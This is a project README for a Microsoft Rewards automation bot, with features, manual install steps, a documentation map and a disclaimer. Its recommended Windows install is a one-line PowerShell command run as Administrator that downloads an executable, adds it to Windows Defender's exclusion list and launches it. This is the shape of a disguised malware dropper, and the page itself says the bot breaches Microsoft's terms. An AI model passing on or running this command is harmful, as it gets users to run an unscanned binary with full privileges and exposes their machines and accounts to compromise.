<div align="center">
  <img src="assets/banner.png" alt="Microsoft Rewards Bot Banner" width="100%">
</div>

<h1 align="center">✦ Microsoft Rewards Bot BETA ✦</h1>

<p align="center">
  <strong>Next-generation source-available Microsoft Rewards automation with a powerful plugin ecosystem.</strong><br>
  <em>⚡ Fast • 🧩 Modular • 🤖 Automated</em>
</p>

<p align="center">
  <a href="https://github.com/QuestPilot/Microsoft-Rewards-Bot/releases/latest">
    <img src="https://img.shields.io/github/v/release/QuestPilot/Microsoft-Rewards-Bot?style=for-the-badge&label=Version&color=0078d4" alt="Latest release">
  </a>
  <img src="https://img.shields.io/badge/Node.js-24.15.0-339933?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node">
  <img src="https://img.shields.io/badge/License-Source_Available-f35325?style=for-the-badge" alt="License">
</p>

---

## 🌌 Introduction

**Microsoft Rewards Bot** delivers a fully automated, hands-free rewards workflow alongside a sophisticated modular plugin system. This application is designed to streamline accounts routine management while showcasing a scalable and dynamic architecture.

### 🌟 Key Features
- 🤖 **Hands-free automation** — daily sets, searches, promotions and more, fully automated.
- 🖥️ **Rewards Desk** — a local control panel opens on `npm start`: run the bot, manage accounts, edit settings, toggle plugins, read the docs, and activate Core.
- 🔌 **Public Plugin API** — build your own tasks and integrations, then share them with the community.
- 🔄 **Smart auto-updates** — stays current automatically on every `npm start`.
- 💎 **Optional Core plugin** — premium automation (coupon claiming, streak protection, double search points, remote dashboard…), enabled with a license.

> [!NOTE]  
> This repository is source-available exclusively for personal non-commercial use and official contributions. It is not licensed for commercial redistribution, unofficial public competing releases, impersonation, or reproducing the proprietary Core plugin.

---

## 🖥️ Remote Dashboard Preview

<div align="center">
  <img width="100%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);" alt="Remote Dashboard" src="https://github.com/user-attachments/assets/1ac4e0c6-0df9-44c3-956a-3a500ab24c69" />
</div>

---

## 🚀 Installation (Windows Automated Script)

> ⚠️ **Required:** You must open and run PowerShell with **Administrator** privileges.

Open PowerShell as Administrator, then effortlessly run the one-line automated installer:

```powershell
$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/HEAD/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f

```

*The installer will automatically fetch the latest stable binary engine directly from the main branch and deploy it locally.*

> **Note:** Only accept software execution from trusted publishers and verified repositories.

---

## 🛠️ Manual CLI Installation

For total configuration control and full transparency, you can clone and install the project manually via NPM:

```bash
# Clone the repository
git clone https://github.com/QuestPilot/Microsoft-Rewards-Bot.git

# Navigate into the project folder
cd Microsoft-Rewards-Bot

# Install official project dependencies
npm install

# Launch the script
npm start

```

*The `main` branch is the supported public channel. The built-in auto-update script reads that branch directly, and the compiled official Core plugin is fully built for the documented Node.js target.*

---

## 📚 Documentation Map

Use this README as the front door, then jump directly into the page that matches what you want to achieve:

| Goal | Documentation Link |
| --- | --- |
| **Install, update, or understand `npm start`** | 📁 [Install and Auto-Updates](docs/updates.md) |
| **Run the bot inside an isolated container** | 🐳 [Docker Deployment](docs/docker.md) |
| **Verify or upgrade the Node.js runtime** | 🟢 [Node.js Version Reference](docs/node-version.md) |
| **Enable, disable, or inspect running plugins** | 🔌 [Plugin System Overview](docs/plugins.md) |
| **Build a public or private plugin** | 🛠️ [Create a Plugin](docs/create-plugin.md) & [Plugin API Reference](docs/plugin-api.md) |
| **Understand the premium core plugin features** | 💎 [Official Core Plugin](docs/core-plugin.md) |
| **Understand Core limitations and built-in security** | 🔒 [Core Technical Reference](docs/core-plugin-reference.md) |
| **Use and configure the official web dashboard** | 🌐 [Core Dashboard](docs/dashboard.md) |
| **Fix common launch, installation or update issues** | 🩺 [Troubleshooting Guide](docs/troubleshooting.md) |
| **Understand licensing and allowed personal use** | 📄 [License](LICENSE) | [Commercial Use](COMMERCIAL.md) | [Trademark Policy](TRADEMARK.md) |

*Can't find what you need? Start with [docs/README.md](docs/README.md) for the full documentation structural index.*

---

## ⚠️ Educational Disclaimer & Terms of Service

This project, along with its source code and plugins, is created **strictly for educational, research, and proof-of-concept purposes**.

* **Academic & Research Focus:** The development of this tool is designed to study automated headless browser interaction, scripting architecture, and modular plugin infrastructures. It is not intended for malicious farming or exploiting platforms.
* **No Liability & Fault:** The developers, maintainers, and contributors of QuestPilot accept **no responsibility or liability whatsoever** for any consequences, actions, blocks, or damages resulting from the execution or use of this software. By downloading or compiling this software, you assume 100% of the risks.
* **Platform Regulations:** Interacting with external rewards platforms using automated bots explicitly breaches the **Microsoft Services Agreement** and Terms of Service (ToS). Doing so will highly likely result in account restriction, point forfeiture, or permanent account bans.
* **End-User Responsibility:** It is the sole responsibility of the end-user to comply with local laws and the rules of any external platforms. The creators cannot be held responsible for account terminations; you use this script entirely at your own discretion.
* **Non-Affiliation:** This repository is an independent open-source initiative and is not affiliated, associated, authorized, endorsed by, or in any way officially connected with Microsoft Corporation or any of its subsidiaries.

---
